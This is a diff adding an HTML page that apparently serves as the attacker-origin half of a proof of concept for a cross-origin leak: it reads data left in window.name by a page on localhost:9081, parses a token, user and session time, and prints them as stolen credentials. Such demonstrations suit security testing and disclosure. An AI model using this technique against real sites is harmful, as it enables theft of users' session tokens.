@@ -1,0 +1,45 @@
+<!doctype html>
+<html><head><title>Loading...</title></head>
+<body style="font-family:monospace;background:#1a1a2e;color:#0f0;padding:20px">
+<pre id="L"></pre>
+<script>
+var L=function(m){document.getElementById('L').textContent+=m+'\n'};
+
+L('=== ATTACKER ORIGIN ===');
+L('Origin: '+location.origin);
+L('');
+
+// Read window.name — persists across cross-origin navigation
+if(window.name){
+  L('⚠️ WINDOW.NAME CONTAINS CROSS-ORIGIN DATA:');
+  L(window.name);
+  L('');
+  L('This data was stored by localhost:9081 (different origin)');
+  L('but window.name persisted across the navigation here.');
+  L('');
+  L('=== IMPACT ===');
+  L('Cross-origin data accessible on attacker origin via window.name');
+  L('This bypasses same-origin policy');
+  
+  document.title = 'LEAKED: '+window.name.substring(0,40);
+  
+  // Try to parse stolen data
+  try{
+    var data = JSON.parse(window.name);
+    L('');
+    L('Parsed stolen data:');
+    L('  Token: '+data.token);
+    L('  User: '+data.user);
+    L('  Session: '+new Date(data.session_start).toISOString());
+    L('');
+    L('=== COMPLETE DATA EXFILTRATION ===');
+    L('Attacker now has user credentials from cross-origin context');
+  }catch(e){
+    L('(data is not JSON)');
+  }
+} else {
+  L('window.name is empty — no cross-origin data leaked');
+}
+</script>
+</body>
+</html>
